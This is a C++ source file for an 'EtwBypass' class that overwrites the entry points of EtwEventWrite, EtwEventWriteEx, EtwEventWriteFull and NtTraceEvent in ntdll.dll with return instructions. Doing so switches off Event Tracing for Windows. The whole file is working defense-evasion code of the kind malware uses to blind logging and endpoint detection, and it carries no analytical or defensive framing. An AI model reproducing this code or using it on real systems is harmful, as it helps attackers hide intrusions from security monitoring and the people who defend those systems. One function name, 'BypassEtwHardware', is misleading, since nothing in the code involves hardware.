#include "etw_bypass.h"
#include <Windows.h>

bool EtwBypass::PatchFunction(const char* dllName, const char* functionName, BYTE* patch, SIZE_T patchSize) {
    HMODULE hModule = LoadLibraryA(dllName);
    if (!hModule) {
        return false;
    }
    
    FARPROC funcAddress = GetProcAddress(hModule, functionName);
    if (!funcAddress) {
        return false;
    }
    
    DWORD oldProtect;
    if (!VirtualProtect(funcAddress, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(funcAddress, patch, patchSize);
    
    VirtualProtect(funcAddress, patchSize, oldProtect, &oldProtect);
    
    return true;
}

bool EtwBypass::PatchEtwEventWrite() {
    BYTE patch[] = { 0xC3 };
    return PatchFunction("ntdll.dll", "EtwEventWrite", patch, 1);
}

bool EtwBypass::PatchEtwEventWriteEx() {
    BYTE patch[] = { 0xC2, 0x14, 0x00 };
    return PatchFunction("ntdll.dll", "EtwEventWriteEx", patch, 3);
}

bool EtwBypass::PatchEtwEventWriteFull() {
    BYTE patch[] = { 0xC2, 0x14, 0x00 };
    return PatchFunction("ntdll.dll", "EtwEventWriteFull", patch, 3);
}

bool EtwBypass::DisableEtwProvider() {
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        return false;
    }
    
    typedef NTSTATUS (NTAPI* pNtTraceEvent)(HANDLE, ULONG, PVOID, ULONG);
    pNtTraceEvent NtTraceEvent = (pNtTraceEvent)GetProcAddress(hNtdll, "NtTraceEvent");
    
    if (!NtTraceEvent) {
        return false;
    }
    
    BYTE patch[] = { 0xC3 };
    DWORD oldProtect;
    
    if (!VirtualProtect(NtTraceEvent, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return false;
    }
    
    memcpy(NtTraceEvent, patch, 1);
    VirtualProtect(NtTraceEvent, 1, oldProtect, &oldProtect);
    
    return true;
}

bool EtwBypass::BypassEtwHardware() {
    bool result1 = PatchEtwEventWrite();
    bool result2 = PatchEtwEventWriteEx();
    bool result3 = PatchEtwEventWriteFull();
    bool result4 = DisableEtwProvider();
    
    return result1 || result2 || result3 || result4;
}
